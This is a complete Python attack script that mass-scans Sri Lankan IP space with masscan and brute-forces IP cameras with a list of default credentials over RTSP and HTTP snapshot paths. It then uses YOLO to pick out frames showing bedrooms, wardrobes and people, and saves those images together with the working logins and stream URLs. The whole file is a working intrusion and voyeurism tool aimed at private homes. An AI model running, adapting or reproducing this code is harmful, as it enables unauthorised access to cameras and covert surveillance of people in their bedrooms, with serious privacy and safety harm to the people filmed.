#!/usr/bin/env python3
"""
TITAN-X Sri Lanka Bedroom/Wardrobe Priority Hunter
Aggressively scans ALL Sri Lanka IP space, tries BOTH RTSP + HTTP snapshot,
validates frames with OpenCV, classifies with YOLO — PRIORITY: bedrooms & wardrobes.
"""
import argparse, ipaddress, subprocess, os, json, sys, time, shutil, re, struct
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError

# ── Config ──────────────────────────────────────────────────────────────
WORKERS = 150          # concurrent probe workers
MASSCAN_RATE = 500000  # packets per second
FFMPEG_TIMEOUT = 5     # seconds per RTSP attempt
HTTP_TIMEOUT = 4       # seconds per HTTP snapshot attempt

WORK_DIR = os.path.abspath(os.path.dirname(__file__))
FRAME_DIR = os.path.join(WORK_DIR, 'lk_frames')
SCENE_DIR = os.path.join(WORK_DIR, 'lk_bedrooms')
os.makedirs(FRAME_DIR, exist_ok=True)
os.makedirs(SCENE_DIR, exist_ok=True)

# ── Credentials ─────────────────────────────────────────────────────────
CREDS = [
    ('admin', '12345'), ('admin', ''), ('admin', 'admin'), ('admin', '1234'),
    ('admin', '123456'), ('admin', '1111'), ('admin', '888888'), ('admin', '666666'),
    ('root', ''), ('root', 'pass'), ('root', '1234'), ('root', 'root'),
    ('root', 'vizxv'), ('root', 'xc3511'), ('supervisor', 'supervisor'),
    ('ubnt', 'ubnt'), ('admin', 'password'), ('admin', 'admin123'),
    ('admin', '54321'), ('admin', 'pass'),
]

# ── RTSP paths ──────────────────────────────────────────────────────────
RTSP_PATHS = [
    '/Streaming/Channels/101', '/Streaming/Channels/1', '/Streaming/Channels/102',
    '/h264/ch1/main/av_stream', '/cam/realmonitor?channel=1&subtype=0',
    '/stream1', '/live/ch00_0', '/onvif1', '/11', '/live0', '/ch0_0.264',
    '/video1', '/MediaInput/h264/stream_1',
]

# ── HTTP snapshot paths (Hikvision, Dahua, generic) ─────────────────────
HTTP_SNAP_PATHS = [
    '/ISAPI/Streaming/channels/101/picture',
    '/ISAPI/Streaming/channels/1/picture',
    '/cgi-bin/snapshot.cgi?channel=1',
    '/snap.jpg', '/snapshot.jpg', '/image.jpg',
    '/cgi-bin/images_cgi?channel=0',
    '/webcapture.jpg?command=snap&channel=1',
    '/capture/ch1',
    '/onvif-http/snapshot?Profile_1',
    '/jpgimage/1/image.jpg',
    '/Streaming/channels/1/picture',
]

# ── Sri Lanka full IP allocation ────────────────────────────────────────
SRI_LANKA_CIDRS = [
    '112.134.0.0/15', '220.247.0.0/17', '203.143.0.0/17', '203.115.0.0/17',
    '124.43.0.0/16', '175.157.0.0/16', '192.248.0.0/16', '103.0.0.0/16',
    '116.206.0.0/15', '43.224.0.0/14', '103.21.0.0/16', '103.24.0.0/14',
    '202.21.0.0/16', '202.69.0.0/16', '61.245.160.0/19', '122.255.0.0/16',
    '180.232.0.0/14', '110.12.0.0/15', '117.247.0.0/16', '123.231.0.0/16',
    '150.129.0.0/16', '163.32.0.0/16',
]

# ── YOLO scene mapping — BEDROOM/WARDROBE PRIORITY ─────────────────────
PRIORITY_SCENES = {'bedroom', 'wardrobe'}
INDOOR_SCENES = {'bedroom', 'wardrobe', 'dining_room', 'kitchen', 'living_room', 'office', 'bathroom', 'indoor'}

SCENE_MAP = {
    # BEDROOM — highest priority
    'bed': 'bedroom', 'teddy bear': 'bedroom', 'hair drier': 'bedroom',
    # WARDROBE indicators (closest COCO classes to wardrobe/closet)
    'suitcase': 'wardrobe', 'handbag': 'wardrobe', 'backpack': 'wardrobe',
    'tie': 'wardrobe',
    # Kitchen
    'refrigerator': 'kitchen', 'oven': 'kitchen', 'microwave': 'kitchen',
    'sink': 'kitchen', 'toaster': 'kitchen',
    # Living room
    'sofa': 'living_room', 'couch': 'living_room', 'tv': 'living_room',
    'remote': 'living_room', 'vase': 'living_room',
    # Dining
    'dining table': 'dining_room', 'bowl': 'dining_room', 'cup': 'dining_room',
    'wine glass': 'dining_room', 'fork': 'dining_room', 'knife': 'dining_room',
    'spoon': 'dining_room', 'bottle': 'dining_room',
    # Office
    'laptop': 'office', 'keyboard': 'office', 'mouse': 'office',
    'book': 'office', 'clock': 'office', 'scissors': 'office',
    # Bathroom
    'toilet': 'bathroom', 'toothbrush': 'bathroom',
    # Indoor generic
    'chair': 'indoor', 'potted plant': 'indoor', 'cell phone': 'indoor',
    # Outdoor (skip)
    'car': 'outside', 'truck': 'outside', 'bus': 'outside', 'bicycle': 'outside',
    'motorcycle': 'outside', 'traffic light': 'outside', 'stop sign': 'outside',
    'fire hydrant': 'outside', 'parking meter': 'outside', 'bench': 'outside',
    # Person
    'person': 'has_person',
}

# ── Stats ───────────────────────────────────────────────────────────────
stats = {
    'rtsp_tried': 0, 'rtsp_found': 0, 'http_tried': 0, 'http_found': 0,
    'total_valid': 0, 'indoor': 0, 'bedroom': 0, 'wardrobe': 0
}


def is_valid_jpeg(path):
    """Verify file is a real JPEG image (not HTML error page)"""
    try:
        sz = os.path.getsize(path)
        if sz < 2000:
            return False
        with open(path, 'rb') as f:
            header = f.read(3)
            if header[:2] != b'\xff\xd8':
                return False  # Not JPEG
            # Also check it's not a tiny placeholder
            f.seek(-2, 2)
            footer = f.read(2)
        # Extra: try OpenCV
        import cv2
        img = cv2.imread(path)
        if img is None:
            return False
        h, w = img.shape[:2]
        if w < 160 or h < 120:
            return False
        return True
    except:
        return False


MAX_CREDS = 0
MAX_RTSP_PATHS = 0
MAX_HTTP_PATHS = 0


def has_tool(name):
    return shutil.which(name) is not None


def parse_ip_list(path):
    ips = set()
    with open(path, 'r') as f:
        for line in f:
            line = line.strip().split('#', 1)[0].strip()
            if not line:
                continue
            try:
                if '/' in line:
                    net = ipaddress.ip_network(line, strict=False)
                    ips.update(str(ip) for ip in net.hosts())
                else:
                    ipaddress.ip_address(line)
                    ips.add(line)
            except ValueError:
                continue
    return ips


def run_masscan(cidr_list, result_file, rate):
    cmd = ['masscan', '-iL', cidr_list, '-p', '554,8000,80,443,8200',
           '--rate', str(rate), '--open-only', '-oG', result_file,
           '--exclude', '255.255.255.255']
    print(f'  Scanning ports 554,8000,80,443,8200 @ {rate} pps...', flush=True)
    try:
        subprocess.run(cmd, capture_output=True, timeout=1800, text=True)
    except subprocess.TimeoutExpired:
        print('  masscan timeout (30min cap)', flush=True)


def parse_masscan_result(result_file):
    ips_by_port = {}
    if os.path.exists(result_file):
        with open(result_file) as f:
            for line in f:
                if line.startswith('#') or not line.strip():
                    continue
                parts = line.split()
                ip = None
                port_num = None
                for i, p in enumerate(parts):
                    if p == 'Host:' and i + 1 < len(parts):
                        ip = parts[i + 1]
                    if 'Ports:' in p and i + 1 < len(parts):
                        port_num = parts[i + 1].split('/')[0]
                if ip and port_num:
                    ips_by_port.setdefault(ip, set()).add(port_num)
    return ips_by_port


def probe_camera(ip):
    """Probe a single IP — try RTSP first, then HTTP snapshots"""
    frame_base = os.path.join(FRAME_DIR, f'{ip.replace(".", "_")}')
    
    max_creds = MAX_CREDS if MAX_CREDS > 0 else 10
    max_rtsp = MAX_RTSP_PATHS if MAX_RTSP_PATHS > 0 else 6
    max_http = MAX_HTTP_PATHS if MAX_HTTP_PATHS > 0 else 12

    # === RTSP PROBING ===
    for user, passwd in CREDS[:max_creds]:
        for rpath in RTSP_PATHS[:max_rtsp]:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = f'{frame_base}_rtsp.jpg'
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=FFMPEG_TIMEOUT, text=True
                )
                if r.returncode == 0 and is_valid_jpeg(frame):
                    stats['rtsp_found'] += 1
                    return {
                        'ip': ip, 'type': 'rtsp', 'user': user, 'password': passwd,
                        'url': rtsp_url, 'path': rpath, 'frame': frame,
                        'size': os.path.getsize(frame),
                    }
            except (subprocess.TimeoutExpired, Exception):
                pass
            try:
                if os.path.exists(frame) and not is_valid_jpeg(frame):
                    os.remove(frame)
            except:
                pass
    
    # === HTTP SNAPSHOT PROBING ===
    import base64
    for user, passwd in CREDS[:max_creds]:  # Top N creds for HTTP
        auth_str = base64.b64encode(f'{user}:{passwd}'.encode()).decode()
        for spath in HTTP_SNAP_PATHS[:max_http]:
            for port in [80, 8000, 443, 8200]:
                scheme = 'https' if port == 443 else 'http'
                snap_url = f'{scheme}://{ip}:{port}{spath}'
                frame = f'{frame_base}_http.jpg'
                try:
                    req = Request(snap_url, headers={
                        'Authorization': f'Basic {auth_str}',
                        'User-Agent': 'Mozilla/5.0',
                    })
                    resp = urlopen(req, timeout=HTTP_TIMEOUT)
                    data = resp.read(5_000_000)  # Max 5MB
                    if len(data) > 2000:
                        with open(frame, 'wb') as f:
                            f.write(data)
                        if is_valid_jpeg(frame):
                            stats['http_found'] += 1
                            return {
                                'ip': ip, 'type': 'http', 'user': user, 'password': passwd,
                                'url': snap_url, 'path': spath, 'frame': frame,
                                'size': os.path.getsize(frame),
                            }
                        else:
                            os.remove(frame)
                except:
                    pass
    
    return None


def classify(model, frame_path):
    """YOLO scene classification with bedroom/wardrobe priority boost"""
    try:
        import cv2
        img = cv2.imread(frame_path)
        if img is None:
            return None
        results = model(frame_path, conf=0.12, verbose=False)
        detections = []
        scene_votes = {}
        has_person = False
        for r in results:
            for box in r.boxes:
                cls = r.names[int(box.cls)]
                conf = float(box.conf)
                detections.append({'object': cls, 'confidence': round(conf, 3)})
                if cls == 'person':
                    has_person = True
                    continue
                scene = SCENE_MAP.get(cls)
                if scene and scene not in ('outside', 'has_person'):
                    # Priority boost: bedroom +50%, wardrobe +30%
                    boost = 1.5 if scene == 'bedroom' else (1.3 if scene == 'wardrobe' else 1.0)
                    scene_votes[scene] = scene_votes.get(scene, 0) + (conf * boost)
        if not scene_votes:
            return {'scene': 'unclassified', 'confidence': 0, 'objects': detections, 'has_person': has_person}
        best = max(scene_votes, key=scene_votes.get)
        return {
            'scene': best, 'confidence': round(scene_votes[best], 3),
            'objects': detections, 'votes': {k: round(v, 3) for k, v in scene_votes.items()},
            'has_person': has_person,
        }
    except Exception as e:
        return None


def main():
    parser = argparse.ArgumentParser(description='TITAN-X Bedroom/Wardrobe CCTV Hunter')
    parser.add_argument('--workers', type=int, default=WORKERS, help='Number of concurrent probe workers')
    parser.add_argument('--rate', type=int, default=MASSCAN_RATE, help='Masscan packets per second')
    parser.add_argument('--targets-file', help='Use existing target IP list file (one IP/CIDR per line)')
    parser.add_argument('--cidr-file', help='Use existing CIDR list file (one CIDR per line)')
    parser.add_argument('--skip-masscan', action='store_true', help='Skip masscan scan and require --targets-file')
    parser.add_argument('--no-yolo', action='store_true', help='Skip YOLO classification')
    parser.add_argument('--find-count', type=int, default=0, help='Stop after finding this many live cameras (0=run full targets)')
    parser.add_argument('--max-creds', type=int, default=0, help='Max credential combinations to try')
    parser.add_argument('--max-rtsp-paths', type=int, default=0, help='Max RTSP paths to try')
    parser.add_argument('--max-http-paths', type=int, default=0, help='Max HTTP snapshot paths to try')
    args = parser.parse_args()

    t_start = time.time()
    print(f'{"="*80}', flush=True)
    print(f'  TITAN-X SRI LANKA — BEDROOM & WARDROBE PRIORITY HUNTER', flush=True)
    print(f'  Country: Sri Lanka (LK) | Priority: BEDROOM, WARDROBE', flush=True)
    print(f'  {len(CREDS)} creds × ({len(RTSP_PATHS)} RTSP + {len(HTTP_SNAP_PATHS)} HTTP) paths', flush=True)
    print(f'  {args.workers} workers | masscan {args.rate} pps', flush=True)
    print(f'  Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', flush=True)
    print(f'{"="*80}\n', flush=True)

    # Load YOLO
    yolo = None
    if not args.no_yolo:
        try:
            from ultralytics import YOLO
            model_path = os.path.join(WORK_DIR, 'yolo11n.pt')
            if not os.path.exists(model_path):
                model_path = 'yolov8n.pt'
            yolo = YOLO(model_path)
            print(f'[+] YOLO loaded: {model_path}\n', flush=True)
        except Exception as e:
            print(f'[!] YOLO failed: {e} (continuing without scene classification)', flush=True)
            yolo = None

    global MAX_CREDS, MAX_RTSP_PATHS, MAX_HTTP_PATHS
    MAX_CREDS = args.max_creds
    MAX_RTSP_PATHS = args.max_rtsp_paths
    MAX_HTTP_PATHS = args.max_http_paths
    find_count = args.find_count

    # ═══════════════════ PHASE 1: TARGET DISCOVERY ═══════════════════
    all_targets = []
    camera_ips = set()
    http_only_ips = set()

    if args.targets_file:
        if not os.path.exists(args.targets_file):
            print(f'[!] targets file not found: {args.targets_file}', flush=True)
            return
        all_targets = sorted(parse_ip_list(args.targets_file))
        print(f'[PHASE 1] SOURCE: targets file {args.targets_file} ({len(all_targets)} IPs)', flush=True)
    else:
        if args.skip_masscan:
            print('[!] skip-masscan requested but no targets file provided', flush=True)
            return
        if not has_tool('masscan'):
            print('[!] masscan not installed; use --targets-file or install masscan', flush=True)
            return

        cidr_file = args.cidr_file or '/tmp/lk_bedroom_cidr.txt'
        result_file = '/tmp/lk_bedroom_masscan.txt'

        if not args.cidr_file:
            with open(cidr_file, 'w') as f:
                f.write('\n'.join(SRI_LANKA_CIDRS))

        print(f'[PHASE 1] MASSCAN — All Sri Lanka ({len(SRI_LANKA_CIDRS)} CIDR ranges)', flush=True)
        run_masscan(cidr_file, result_file, args.rate)

        ips_by_port = parse_masscan_result(result_file)
        camera_ips = set()
        http_only_ips = set()
        for ip, ports in ips_by_port.items():
            if '554' in ports or '8000' in ports:
                camera_ips.add(ip)
            elif '80' in ports or '443' in ports or '8200' in ports:
                http_only_ips.add(ip)

        total_hosts = len(ips_by_port)
        print(f'  {total_hosts} unique hosts | {len(camera_ips)} camera IPs (554/8000) | {len(http_only_ips)} HTTP-only', flush=True)
        all_targets = list(camera_ips) + list(http_only_ips)

    if not all_targets:
        print('[!] No targets to probe. Exiting.', flush=True)
        return

    total_hosts = len(all_targets)
    print(f'  >>> PROBING ALL {total_hosts} TARGETS <<<\n', flush=True)
    # ═══════════════════ PHASE 2: PROBE ═══════════════════
    print(f'[PHASE 2] PROBE — {len(all_targets)} targets | {args.workers} workers | RTSP + HTTP snapshot', flush=True)
    streams = []
    done = 0
    t_probe = time.time()

    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = {pool.submit(probe_camera, ip): ip for ip in all_targets}
        for fut in as_completed(futures):
            done += 1
            try:
                r = fut.result()
                if r:
                    streams.append(r)
                    el = time.time() - t_probe

                    # Immediate YOLO on discovery
                    scene_tag = ''
                    if yolo:
                        cls = classify(yolo, r['frame'])
                        if cls:
                            r['scene'] = cls
                            sc = cls['scene']
                            objs = [d['object'] for d in cls.get('objects', [])[:6]]
                            is_priority = sc in PRIORITY_SCENES
                            is_indoor = sc in INDOOR_SCENES

                            if is_priority:
                                stats['bedroom' if sc == 'bedroom' else 'wardrobe'] += 1
                                stats['indoor'] += 1
                                scene_tag = f' ★★★ {sc.upper()} ★★★'
                                dst = os.path.join(SCENE_DIR, f'LK_{sc}_{r["ip"].replace(".", "_")}.jpg')
                                shutil.copy2(r['frame'], dst)
                                r['priority_file'] = dst
                            elif is_indoor:
                                stats['indoor'] += 1
                                scene_tag = f' ◆ {sc}'
                                dst = os.path.join(SCENE_DIR, f'LK_{sc}_{r["ip"].replace(".", "_")}.jpg')
                                shutil.copy2(r['frame'], dst)
                            else:
                                scene_tag = f' ({sc})'

                    person = ' [PERSON]' if r.get('scene', {}).get('has_person') else ''
                    print(f'  ✓ #{len(streams):>3} {r["ip"]:>16} | {r["type"]:>4} | {r["user"]}:{r["password"]:>8} | {r["size"]:>7,}B{scene_tag}{person} | {el:.0f}s', flush=True)
                    stats['total_valid'] += 1

                    if find_count > 0 and len(streams) >= find_count:
                        print(f'  [*] Reached find-count target: {find_count}. Cancelling remaining probes.', flush=True)
                        for pending in futures:
                            if not pending.done():
                                pending.cancel()
                        break
            except Exception as e:
                print(f'[!] probe failed {futures[fut]}: {e}', flush=True)

            if done % 500 == 0:
                el = time.time() - t_probe
                rate = done / max(el, 1)
                eta = (len(all_targets) - done) / max(rate, 0.1)
                print(f'  [{done:>6}/{len(all_targets)}] {el:.0f}s | {len(streams)} streams | {rate:.1f}/s | ETA {eta:.0f}s | BR={stats["bedroom"]} WR={stats["wardrobe"]} IN={stats["indoor"]}', flush=True)

    el_total = time.time() - t_start

    # ═══════════════════ FINAL REPORT ═══════════════════

    # ═══════════════════ FINAL REPORT ═══════════════════
    print(f'\n{"="*80}', flush=True)
    print(f'  SRI LANKA BEDROOM/WARDROBE HUNT — COMPLETE', flush=True)
    print(f'  {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} | {el_total:.0f}s total', flush=True)
    print(f'{"="*80}', flush=True)
    print(f'  Hosts scanned:   {total_hosts:,}', flush=True)
    print(f'  Targets probed:  {len(all_targets):,}', flush=True)
    print(f'  Live streams:    {len(streams)}', flush=True)
    print(f'  RTSP streams:    {stats["rtsp_found"]}', flush=True)
    print(f'  HTTP snapshots:  {stats["http_found"]}', flush=True)
    print(f'  ─────────────────────────────', flush=True)
    print(f'  ★ BEDROOMS:      {stats["bedroom"]}', flush=True)
    print(f'  ★ WARDROBES:     {stats["wardrobe"]}', flush=True)
    print(f'  ◆ Indoor total:  {stats["indoor"]}', flush=True)
    
    # Scene breakdown
    scene_counts = {}
    for s in streams:
        sc = s.get('scene', {}).get('scene', 'unclassified')
        scene_counts[sc] = scene_counts.get(sc, 0) + 1
    
    if scene_counts:
        print(f'\n  Scene Breakdown:', flush=True)
        for sc, cnt in sorted(scene_counts.items(), key=lambda x: -x[1]):
            marker = ' ★★★ PRIORITY' if sc in PRIORITY_SCENES else (' ◆ indoor' if sc in INDOOR_SCENES else '')
            print(f'    {sc:>16}: {cnt}{marker}', flush=True)
    
    # List all indoor streams
    indoor_streams = [s for s in streams if s.get('scene', {}).get('scene', '') in INDOOR_SCENES]
    if indoor_streams:
        print(f'\n  ═══ INDOOR CAMERAS ({len(indoor_streams)}) ═══', flush=True)
        for i, s in enumerate(indoor_streams, 1):
            sc = s.get('scene', {})
            objs = ', '.join(d['object'] for d in sc.get('objects', [])[:5])
            pr = '★★★' if sc.get('scene') in PRIORITY_SCENES else '◆'
            person = ' [PERSON]' if sc.get('has_person') else ''
            print(f'  {pr} {i}. {s["ip"]:>16} | {sc.get("scene","?"):>12} ({sc.get("confidence",0):.2f}) | {s["type"]} {s["user"]}:{s["password"]}{person}', flush=True)
            print(f'        URL: {s["url"]}', flush=True)
            if objs:
                print(f'        Objects: {objs}', flush=True)
    
    # List ALL streams
    print(f'\n  ═══ ALL LIVE STREAMS ({len(streams)}) ═══', flush=True)
    for i, s in enumerate(streams, 1):
        sc = s.get('scene', {})
        scene_name = sc.get('scene', '?')
        person = ' [P]' if sc.get('has_person') else ''
        tag = '★' if scene_name in PRIORITY_SCENES else ('◆' if scene_name in INDOOR_SCENES else ' ')
        print(f'  {tag} {i:>3}. {s["ip"]:>16} | {scene_name:>12} | {s["type"]:>4} | {s["user"]}:{s["password"]}{person}', flush=True)
    
    # Save JSON
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = os.path.join(WORK_DIR, f'lk_bedroom_hunt_{ts}.json')
    save = {
        'country': 'LK', 'priority': ['bedroom', 'wardrobe'], 'scan_time': ts,
        'masscan': {'total': total_hosts, 'cameras': len(camera_ips), 'http_only': len(http_only_ips)},
        'results': {'streams': len(streams), 'rtsp': stats['rtsp_found'], 'http': stats['http_found'],
                    'bedrooms': stats['bedroom'], 'wardrobes': stats['wardrobe'], 'indoor': stats['indoor']},
        'streams': [{k: v for k, v in s.items() if k not in ('frame',)} for s in streams],
    }
    with open(out, 'w') as f:
        json.dump(save, f, indent=2, default=str)
    print(f'\n  [+] Saved: {out}', flush=True)
    
    # List saved bedroom/wardrobe files
    priority_files = [s.get('priority_file') for s in streams if s.get('priority_file')]
    if priority_files:
        print(f'\n  ★★★ PRIORITY FRAME FILES ★★★', flush=True)
        for pf in priority_files:
            print(f'    {pf}', flush=True)
    
    print(f'\n  *** SCAN COMPLETE ***', flush=True)


if __name__ == '__main__':
    main()
